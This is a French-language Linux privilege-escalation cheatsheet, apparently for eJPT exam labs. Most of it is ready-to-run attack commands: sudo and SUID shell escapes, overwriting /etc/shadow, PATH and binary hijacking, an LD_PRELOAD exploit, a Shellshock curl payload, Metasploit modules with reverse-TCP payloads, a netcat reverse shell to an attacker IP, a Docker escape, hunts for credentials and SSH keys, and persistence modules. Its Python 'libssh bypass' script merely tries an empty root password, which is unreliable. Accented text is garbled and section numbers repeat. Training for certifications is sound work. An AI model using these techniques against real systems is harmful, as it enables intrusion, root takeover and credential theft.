# üêß Linux Privilege Escalation - Cheatsheet eJPT

## üîç 1. √ânum√©ration initiale

### Informations syst√®me de base
| Commande | Description |
|----------|-------------|
| `whoami` | Utilisateur actuel |
| `id` | UID, GID et groupes de l'utilisateur |
| `uname -a` | Informations kernel et architecture |
| `lsb_release -a` | Distribution Linux |
| `cat /etc/os-release` | Version du syst√®me |
| `hostname` | Nom de la machine |
| `uptime` | Temps de fonctionnement |
| `date` | Date et heure syst√®me |

### Utilisateurs et groupes
| Commande | Description |
|----------|-------------|
| `cat /etc/passwd` | Liste des utilisateurs |
| `cat /etc/group` | Liste des groupes |
| `cat /etc/shadow` | Hashes des mots de passe (si accessible) |
| `w` | Utilisateurs connect√©s |
| `last` | Derni√®res connexions |
| `who` | Utilisateurs actuellement connect√©s |
| `groups` | Groupes de l'utilisateur actuel |

---

## üîí 2. Permissions et privil√®ges

### Commandes sudo
| Commande | Description |
|----------|-------------|
| `sudo -l` | Privil√®ges sudo disponibles |
| `sudo -V` | Version de sudo |
| `cat /etc/sudoers` | Configuration sudo (si accessible) |

### Exploitation sudo (Misconfiguration)

#### Exemple 1: Escalation via man
```bash
student@target:~$ sudo -l
Matching Defaults entries for student on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
User student may run the following commands on target:
    (root) NOPASSWD: /usr/bin/man

# Exploitation:
sudo man ls
!/bin/bash
# ‚Üí Shell root obtenu
```

#### Exemple 2: Fichier /etc/shadow en √©criture
```bash
john@target2:~$ ls -la /etc/shadow
-rw-rw-rw- 1 root shadow 959 Nov 14  2024 /etc/shadow
# ‚Üí Fichier editable !

# Exploitation:
# 1. G√©n√©rer un hash de mot de passe
openssl passwd -1 -salt abc passwd
# R√©sultat: $1$abc$qBiMc4NzTo1K6hhLFiSfX1

# 2. Remplacer le hash de root dans /etc/shadow
# Ligne originale: root:!:...
# Ligne modifi√©e: root:$1$abc$qBiMc4NzTo1K6hhLFiSfX1:...

# 3. Se connecter en root
su root
# Password: passwd
```

### Fichiers SUID/SGID
| Commande | Description |
|----------|-------------|
| `find / -perm -4000 2>/dev/null` | Fichiers SUID |
| `find / -perm -2000 2>/dev/null` | Fichiers SGID |
| `find / -perm -6000 2>/dev/null` | Fichiers SUID et SGID |
| `find / -perm -1000 2>/dev/null` | Fichiers avec sticky bit |

### Capabilities
| Commande | Description |
|----------|-------------|
| `getcap -r / 2>/dev/null` | Fichiers avec capabilities |
| `capsh --print` | Capabilities actuelles |

---

## üìÅ 3. Syst√®me de fichiers

### Fichiers et r√©pertoires accessibles en √©criture
| Commande | Description |
|----------|-------------|
| `find / -writable -type d 2>/dev/null` | R√©pertoires accessibles en √©criture |
| `find / -perm -222 -type f 2>/dev/null` | Fichiers accessibles en √©criture |
| `find / -perm -o w -type d 2>/dev/null` | R√©pertoires world-writable |
| `ls -la /tmp /var/tmp /dev/shm` | R√©pertoires temporaires |

### Fichiers de configuration importants
| Fichier | Description |
|---------|-------------|
| `/etc/passwd` | Informations utilisateurs |
| `/etc/shadow` | Hashes des mots de passe |
| `/etc/hosts` | R√©solution DNS locale |
| `/etc/crontab` | T√¢ches cron syst√®me |
| `/etc/fstab` | Points de montage |
| `/etc/exports` | Partages NFS |
| `/etc/ssh/sshd_config` | Configuration SSH |

---

## ‚è∞ 4. T√¢ches planifi√©es (Cron)

### √ânum√©ration des t√¢ches cron
| Commande | Description |
|----------|-------------|
| `crontab -l` | T√¢ches cron de l'utilisateur |
| `crontab -u root -l` | T√¢ches cron de root (si permissions) |
| `cat /etc/crontab` | T√¢ches cron syst√®me |
| `cat /etc/cron.d/*` | T√¢ches cron additionnelles |
| `ls -la /etc/cron.*` | R√©pertoires cron |
| `systemctl list-timers` | Timers systemd |

### Surveillance des t√¢ches cron
| Commande | Description |
|----------|-------------|
| `ps aux \| grep cron` | Processus cron actifs |
| `pspy64` | Surveillance des processus (outil externe) |

---

## üîß 5. Processus et services

### Processus en cours
| Commande | Description |
|----------|-------------|
| `ps aux` | Tous les processus |
| `ps -ef` | Processus avec PPID |
| `top` | Processus en temps r√©el |
| `htop` | Interface am√©lior√©e (si disponible) |
| `lsof` | Fichiers ouverts par processus |

### Services syst√®me
| Commande | Description |
|----------|-------------|
| `systemctl list-units --type=service` | Services systemd |
| `service --status-all` | √âtat des services (SysV) |
| `chkconfig --list` | Services au d√©marrage (CentOS/RHEL) |
| `netstat -tulpn` | Services r√©seau actifs |
| `ss -tulpn` | Alternative moderne √† netstat |

---

## üåê 6. R√©seau

### Configuration r√©seau
| Commande | Description |
|----------|-------------|
| `ifconfig` | Configuration des interfaces |
| `ip addr show` | Adresses IP (ip moderne) |
| `ip route show` | Table de routage |
| `arp -a` | Table ARP |
| `netstat -rn` | Table de routage |

### Connexions r√©seau
| Commande | Description |
|----------|-------------|
| `netstat -tulpn` | Ports ouverts et services |
| `ss -tulpn` | Ports ouverts (outil moderne) |
| `netstat -an` | Toutes les connexions |
| `lsof -i` | Fichiers r√©seau ouverts |

---

## üõ†Ô∏è 7. Techniques d'escalade courantes

### SUID Exploitation
| Binaire | Technique |
|---------|-----------|
| `/bin/bash` | `bash -p` |
| `/bin/sh` | `sh -p` |
| `/usr/bin/find` | `find . -exec /bin/sh -p \; -quit` |
| `/usr/bin/vim` | `:!sh` ou `:set shell=/bin/sh` puis `:shell` |
| `/usr/bin/awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `/usr/bin/nmap` | `nmap --interactive` puis `!sh` |
| `/usr/bin/less` | `less /etc/passwd` puis `!/bin/sh` |
| `/usr/bin/more` | `more /etc/passwd` puis `!/bin/sh` |

### Exploitation de programmes SUID personnalis√©s

#### Exemple pratique : Binary Hijacking (Lab)
```bash
# 1. Identifier le binaire SUID
ls -l welcome
# -rwsr-xr-x 1 root root 8760 Nov 14  2024 welcome

# 2. V√©rifier le type de fichier
file welcome
# welcome: ELF 64-bit LSB executable, x86-64

# 3. Analyser le binaire avec strings
strings welcome
# Rechercher des appels de programmes externes
# R√©sultat: le binaire appelle "greetings"

# 4. Exploitation par remplacement du binaire appel√©
# Supprimer le binaire original
rm greetings

# Remplacer par /bin/bash
cp /bin/bash greetings

# 5. Ex√©cuter le binaire SUID vuln√©rable
./welcome
# ‚Üí Shell root obtenu !

# 6. V√©rifier l'escalade
whoami
# root

# 7. Collecter le flag
cat /root/flag
# Flag: b92bcdc876d52108778e2d81f3b01494
```

#### M√©thodologie g√©n√©rale pour programmes SUID vuln√©rables

**Phase 1 : Identification**
```bash
# Recherche de binaires SUID personnalis√©s
find / -perm -4000 -type f 2>/dev/null | grep -v "/bin\|/usr/bin\|/sbin\|/usr/sbin"

# Analyse des permissions
ls -la <binary_suid>
```

**Phase 2 : Analyse du binaire**
```bash
# Analyse des cha√Ænes de caract√®res
strings <binary_suid>

# Analyse des appels syst√®me (si disponible)
strace <binary_suid> 2>&1 | grep execve

# Analyse des biblioth√®ques
ldd <binary_suid>

# D√©sassemblage basique (si objdump disponible)
objdump -d <binary_suid>
```

**Phase 3 : Techniques d'exploitation**

**3.1 - Path Hijacking**
```bash
# Si le binaire appelle une commande sans chemin absolu
echo '#!/bin/bash' > /tmp/vulnerable_command
echo '/bin/bash -p' >> /tmp/vulnerable_command
chmod +x /tmp/vulnerable_command
export PATH=/tmp:$PATH
./<binary_suid>
```

**3.2 - Binary Replacement (comme dans le lab)**
```bash
# Identifier le binaire appel√©
strings <binary_suid> | grep -E "^[a-zA-Z0-9_]+$"

# Remplacer le binaire dans le r√©pertoire courant
mv <binary_appel√©> <binary_appel√©>.bak
cp /bin/bash <binary_appel√©>
./<binary_suid>
```

**3.3 - Environment Variable Exploitation**
```bash
# Exploitation via LD_PRELOAD (si autoris√©)
echo 'void _init() { system("/bin/bash -p"); }' > /tmp/exploit.c
gcc -shared -fPIC -nostartfiles /tmp/exploit.c -o /tmp/exploit.so
LD_PRELOAD=/tmp/exploit.so ./<binary_suid>
```

**3.4 - Symlink Attack**
```bash
# Si le binaire √©crit dans un fichier pr√©dictible
ln -sf /etc/passwd /tmp/target_file
./<binary_suid>
```

### Sudo exploitation
| Commande autoris√©e | Technique |
|-------------------|-----------|
| `sudo vi /path/file` | `:!sh` dans vi |
| `sudo nano /path/file` | `Ctrl+R Ctrl+X` puis `reset; sh 1>&0 2>&0` |
| `sudo awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `sudo find` | `sudo find . -exec /bin/sh \; -quit` |
| `sudo python` | `sudo python -c 'import os; os.system("/bin/sh")'` |
| `sudo man` | `man ls` puis `!/bin/bash` |

### Variables d'environnement
| Variable | Exploitation |
|----------|--------------|
| `LD_PRELOAD` | Injection de biblioth√®que dynamique |
| `LD_LIBRARY_PATH` | D√©tournement de biblioth√®que |
| `PATH` | Hijacking de commandes |

---

## üîç 8. Outils d'√©num√©ration automatis√©s

### LinPEAS
| Commande | Description |
|----------|-------------|
| `./linpeas.sh` | Scan complet automatis√© |
| `./linpeas.sh -a` | Scan avec tous les checks |
| `./linpeas.sh -s` | Scan rapide |
| `./linpeas.sh -P` | Affichage avec couleurs |

### LinEnum
| Commande | Description |
|----------|-------------|
| `./LinEnum.sh` | √ânum√©ration compl√®te |
| `./LinEnum.sh -t` | Mode thorough |
| `./LinEnum.sh -k keyword` | Recherche de mots-cl√©s |

### Linux Exploit Suggester
| Commande | Description |
|----------|-------------|
| `./linux-exploit-suggester.sh` | Suggestion d'exploits kernel |
| `./linux-exploit-suggester-2.pl` | Version Perl |

---

## üí• 9. Exploits kernel courants

### CVE par version de kernel
| Version | CVE | Nom | Description |
|---------|-----|-----|-------------|
| **2.6.22 < 3.9** | CVE-2016-5195 | Dirty COW | Race condition copy-on-write |
| **< 2.6.37** | CVE-2010-3904 | RDS Exploit | Privilege escalation via RDS |
| **2.6.39 < 3.2.2** | CVE-2012-0056 | Mempodipper | /proc/*/mem vulnerability |
| **3.13 < 3.19** | CVE-2015-1328 | ofs | OverlayFS privilege escalation |
| **4.4.0 < 4.4.0-21** | CVE-2017-16995 | bpf | eBPF verifier vulnerability |
| **< 4.14.11** | CVE-2017-1000405 | HugeDirty | Huge page dirty COW |

### Exploitation avec Metasploit
| Module | Description |
|--------|-------------|
| `exploit/linux/local/cve_2016_5195_dirtycow` | Dirty COW exploit |
| `exploit/linux/local/overlayfs_priv_esc` | OverlayFS escalation |
| `exploit/linux/local/bpf_priv_esc` | eBPF privilege escalation |

---

## üîê 10. Recherche de credentials

### Fichiers de configuration
| Commande | Description |
|----------|-------------|
| `grep -r "password" /etc/ 2>/dev/null` | Recherche de mots de passe |
| `find /home -name "*.txt" -exec grep -l "pass" {} \;` | Fichiers avec "pass" |
| `grep -r "user" /var/www/ 2>/dev/null` | Credentials dans web apps |

### Historique et logs
| Fichier | Description |
|---------|-------------|
| `~/.bash_history` | Historique bash |
| `~/.mysql_history` | Historique MySQL |
| `~/.python_history` | Historique Python |
| `/var/log/auth.log` | Logs d'authentification |
| `/var/log/syslog` | Logs syst√®me |

### Cl√©s SSH
| Commande | Description |
|----------|-------------|
| `find / -name "*.key" 2>/dev/null` | Cl√©s priv√©es |
| `find / -name "*_rsa" 2>/dev/null` | Cl√©s RSA |
| `find / -name "*_dsa" 2>/dev/null` | Cl√©s DSA |
| `find / -name "authorized_keys" 2>/dev/null` | Cl√©s autoris√©es |

---

## üî• 11. Exploitation via Shellshock (CGI Web-to-System)

### Reconnaissance web pour escalade syst√®me
```bash
# Scan des services web
nmap -p 80,443,8080 --script http-enum <target>

# Recherche de scripts CGI vuln√©rables
dirb http://<target> /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x cgi,sh,pl,py

# Scripts CGI communs
/cgi-bin/test.cgi
/cgi-bin/admin.cgi  
/gettime.cgi
/status.cgi
```

### D√©tection de Shellshock (CVE-2014-6271)
```bash
# Test avec Nmap NSE
nmap --script http-shellshock --script-args "http-shellshock.uri=/cgi-bin/test.cgi" <target>

# Test manuel avec curl
curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'whoami'" http://<target>/cgi-bin/test.cgi
```

### Exploitation Shellshock avec Metasploit (M√©thode Lab)
```bash
# Module de scan/d√©tection
msfconsole -q
use auxiliary/scanner/http/apache_mod_cgi_bash_env
set RHOSTS <target>
set TARGETURI /cgi-bin/test.cgi
run

# Module d'exploitation avec Meterpreter
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set TARGETURI /cgi-bin/test.cgi
set LHOST <your_ip>
set payload linux/x86/meterpreter/reverse_tcp
exploit

# Post-exploitation imm√©diate
meterpreter > sysinfo
meterpreter > getuid
meterpreter > pwd

# Navigation pour flags (exemple lab)
meterpreter > cd /
meterpreter > ls
meterpreter > cat flag.txt                    # Flag 1

meterpreter > cd /opt/apache/htdocs/
meterpreter > ls -la
meterpreter > cat .flag.txt                   # Flag 2 (fichier cach√©)
```

---

## üîê 12. Exploitation libssh_auth_bypass (SSH System Access)

### D√©tection de vuln√©rabilit√© libssh
```bash
# Scan SSH sp√©cifique
nmap -p 22 -sV <target>
nmap --script ssh* -p 22 <target>

# D√©tection de versions vuln√©rables
nmap --script ssh-auth-methods,ssh2-enum-algos -p 22 <target>
```

### Exploitation avec Metasploit (M√©thode Lab)
```bash
# Module d'exploitation libssh
msfconsole -q
use exploit/linux/ssh/libssh_auth_bypass
set RHOSTS target2.ine.local
set SPAWN_PTY true
run

# Interaction avec la session
sessions -l
sessions -i <session_id>

# Navigation imm√©diate
pwd
whoami
id

# Recherche Flag 3 (home directory)
cd /home/user
ls -la
cat flag.txt
```

### Script Python manuel pour libssh bypass
```python
#!/usr/bin/env python3
import paramiko
import sys

def libssh_bypass(host, port=22):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Bypass authentication
        ssh.connect(host, port=port, username='root', password='', 
                   auth_timeout=1, banner_timeout=1)
        
        print(f"[+] Successfully bypassed authentication on {host}")
        
        # Enum√©ration imm√©diate
        stdin, stdout, stderr = ssh.exec_command('whoami')
        print(f"User: {stdout.read().decode().strip()}")
        
        # Recherche de flags
        stdin, stdout, stderr = ssh.exec_command('find /home -name "*flag*" 2>/dev/null')
        print(f"Flags found: {stdout.read().decode().strip()}")
        
        return ssh
    except Exception as e:
        print(f"[-] Bypass failed: {e}")
        return None

if len(sys.argv) != 2:
    print("Usage: python3 libssh_bypass.py <target>")
    sys.exit(1)

ssh = libssh_bypass(sys.argv[1])
```

---

## üëë 13. Escalade SUID avanc√©e (Welcome Binary Lab)

### D√©tection de binaires SUID personnalis√©s (Lab method)
```bash
# Recherche dans r√©pertoire utilisateur
ls -la
# Identifier des binaires avec SUID bit : -rwsr-xr-x

# V√©rification sp√©cifique
ls -la welcome
# -rwsr-xr-x 1 root root 8760 Nov 14  2024 welcome

# Analyse du type de fichier
file welcome
# welcome: ELF 64-bit LSB executable, x86-64
```

### Analyse du binaire vuln√©rable (M√©thode Lab)
```bash
# Analyse des cha√Ænes de caract√®res
strings welcome
# Rechercher des appels de programmes externes
# R√©sultat typique: le binaire appelle "greetings"

# V√©rification des appels syst√®me
strace ./welcome 2>&1 | grep execve
# Identifier les binaires/scripts appel√©s

# Test d'ex√©cution normal
./welcome
# Observer le comportement standard
```

### Exploitation par Binary Hijacking (Lab exact)
```bash
# 1. Identifier le binaire appel√© (greetings)
strings welcome | grep -v "^/\|lib\|ELF"

# 2. V√©rifier l'existence du binaire appel√©
ls -la greetings

# 3. Exploitation - Remplacer le binaire
rm greetings                    # Supprimer l'original
cp /bin/bash greetings          # Remplacer par bash

# 4. Ex√©cution du binaire SUID vuln√©rable
./welcome
# ‚Üí Shell root obtenu automatiquement !

# 5. V√©rification de l'escalade
whoami
# root

# 6. Navigation vers flag final
cd /root
ls -la
cat flag.txt                    # Flag 4
# Flag: b92bcdc876d52108778e2d81f3b01494
```

### Techniques alternatives de Binary Hijacking
```bash
# M√©thode 1: Script shell personnalis√©
echo '#!/bin/bash' > greetings
echo '/bin/bash -p' >> greetings
chmod +x greetings
./welcome

# M√©thode 2: Python reverse shell
echo '#!/usr/bin/env python3' > greetings
echo 'import os; os.system("/bin/bash -p")' >> greetings
chmod +x greetings
./welcome

# M√©thode 3: Netcat reverse shell
echo '#!/bin/bash' > greetings
echo 'nc -e /bin/bash <your_ip> <port>' >> greetings
chmod +x greetings
# Puis: nc -nvlp <port> (sur attacker)
./welcome
```

---

## üïµÔ∏è 14. Workflow complet Lab-style

### Reconnaissance initiale syst√®me
```bash
# √ânum√©ration de base (toujours commencer par √ßa)
whoami && id && uname -a && hostname

# Recherche SUID standard
find / -perm -4000 -type f 2>/dev/null

# Recherche dans r√©pertoire courant
ls -la
ls -la welcome*  # Si binaire sp√©cifique d√©tect√©

# V√©rification sudo
sudo -l 2>/dev/null
```

### Analyse de binaires SUID suspects
```bash
# Pour chaque binaire SUID trouv√©
file <binary>
strings <binary> | head -20
strings <binary> | grep -E "^[a-zA-Z0-9_./]+$"

# Test d'ex√©cution s√©curis√©
strace <binary> 2>&1 | grep -E "execve|open|access" | head -10
```

### Exploitation syst√©matique
```bash
# 1. Path Hijacking (si appel sans chemin absolu)
echo '/bin/bash -p' > /tmp/<command>
chmod +x /tmp/<command>
export PATH=/tmp:$PATH
./<binary_suid>

# 2. Binary Replacement (m√©thode lab)
# Si le binaire appelle un fichier dans le r√©pertoire courant
mv <called_binary> <called_binary>.bak  2>/dev/null
cp /bin/bash <called_binary>
./<binary_suid>

# 3. Symlink Attack
# Si √©criture dans fichier pr√©dictible
ln -sf /etc/shadow /tmp/target_file
./<binary_suid>
```

---

## üöÄ 15. Post-exploitation avec Metasploit

### Modules de reconnaissance
| Module | Description |
|--------|-------------|
| `post/linux/gather/enum_configs` | √ânum√©ration des configurations |
| `post/linux/gather/enum_network` | √ânum√©ration r√©seau |
| `post/linux/gather/enum_system` | √ânum√©ration syst√®me |
| `post/linux/gather/checkvm` | D√©tection de virtualisation |
| `post/multi/recon/local_exploit_suggester` | Suggestion d'exploits |

### Modules de persistence
| Module | Description |
|--------|-------------|
| `post/linux/manage/sshkey_persistence` | Persistence via cl√© SSH |
| `post/linux/manage/download_exec` | T√©l√©chargement et ex√©cution |
| `exploit/linux/local/cron_persistence` | Persistence via cron |

---

## üîß 12. Techniques avanc√©es

### Docker Escape
| Commande | Description |
|----------|-------------|
| `ls -la /var/run/docker.sock` | Socket Docker accessible |
| `docker ps` | Conteneurs en cours |
| `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | Montage du syst√®me h√¥te |

### Exploitation de services
| Service | Technique |
|---------|-----------|
| **MySQL** | `mysql -u root -p` avec credentials trouv√©s |
| **PostgreSQL** | `psql -U postgres` |
| **Redis** | `redis-cli` puis commandes Redis |
| **MongoDB** | `mongo` sans authentification |

---

## üìù 13. Scripts utiles

### One-liners pour l'√©num√©ration
```bash
# √ânum√©ration rapide
echo "=== SYSTEM INFO ===" && uname -a && echo "=== USER INFO ===" && id && echo "=== SUDO ===" && sudo -l

# Recherche de fichiers SUID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# Processus suspects
ps auxf | grep -v "\["

# T√¢ches cron
cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -v "^#"
```

### Script d'√©num√©ration custom
```bash
#!/bin/bash
echo "[+] Basic System Info"
uname -a
echo "[+] Current User"
id
echo "[+] Sudo Permissions"
sudo -l 2>/dev/null
echo "[+] SUID Files"
find / -perm -4000 2>/dev/null
echo "[+] Writable Directories"
find / -writable -type d 2>/dev/null | head -20
```

---

## üí° 14. Conseils pour l'eJPT

### Workflow recommand√© (Bas√© sur les labs)

#### 1. Reconnaissance web ‚Üí syst√®me (Target1 style)
```bash
# √ânum√©ration de base
id && uname -a && sudo -l

# Si acc√®s web disponible
nmap --script http-shellshock --script-args "http-shellshock.uri=/cgi-bin/test.cgi" <target>

# Exploitation Shellshock ‚Üí Meterpreter
use exploit/multi/http/apache_mod_cgi_bash_env_exec
# Recherche imm√©diate des flags
meterpreter > find / -name "*flag*" -type f 2>/dev/null
```

#### 2. Exploitation SSH ‚Üí escalade (Target2 style)
```bash
# Reconnaissance SSH
nmap -p 22 -sV <target>

# Exploitation libssh
use exploit/linux/ssh/libssh_auth_bypass

# Une fois connect√©: recherche de binaires SUID
find / -perm -4000 -type f 2>/dev/null | grep -v "/bin\|/usr/bin\|/sbin\|/usr/sbin"
```

#### 3. Analyse binaires SUID (Welcome binary style)
```bash
# Dans r√©pertoire utilisateur
ls -la
strings welcome
# Exploitation par binary replacement
rm greetings && cp /bin/bash greetings && ./welcome
```

#### 4. Collecte de flags syst√©matique
```bash
# Flags communs dans labs eJPT
cat /flag                        # Flag racine
cat /flag.txt                    # Variante .txt
ls -la /opt/apache/htdocs/       # Flags cach√©s web
cat /opt/apache/htdocs/.flag*    # Fichiers cach√©s
find /home -name "*flag*" -type f 2>/dev/null  # Flags utilisateurs
cat /root/flag*                  # Flags root (apr√®s escalade)
```

### Points d'attention labs eJPT (Mise √† jour)
- **Shellshock exploitation** ‚Üí Acc√®s syst√®me imm√©diat via web
- **libssh_auth_bypass** ‚Üí Bypass SSH sans credentials  
- **Binary hijacking SUID** ‚Üí Technique tr√®s courante dans labs
- **Flags cach√©s** ‚Üí Toujours v√©rifier fichiers commen√ßant par '.'
- **Metasploit Meterpreter** ‚Üí Plus stable que shells basiques
- **GTFOBins + Lab techniques** ‚Üí Combinaison gagnante

### Commandes essentielles √† retenir (Mise √† jour labs)
```bash
# Reconnaissance imm√©diate
id && uname -a && sudo -l && ls -la

# SUID files (focus r√©pertoire courant)
find / -perm -4000 2>/dev/null
find . -perm -4000 2>/dev/null

# Analyse binaire suspect
strings <binary> && file <binary>

# Binary hijacking rapide
cp /bin/bash <called_program> && ./<suid_binary>

# Recherche flags exhaustive
find / -name "*flag*" -o -name ".*flag*" 2>/dev/null
```

### Ressources externes importantes
- **GTFOBins** : https://gtfobins.github.io/
- **Linux Privilege Escalation** : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- **PayloadsAllTheThings** : Linux privilege escalation

**üéØ Conseil final** : Dans l'eJPT Linux, focus sur SUID exploitation, sudo misconfiguration, et l'utilisation de LinPEAS pour l'√©num√©ration automatis√©e. Les kernel exploits sont moins fr√©quents mais toujours possibles !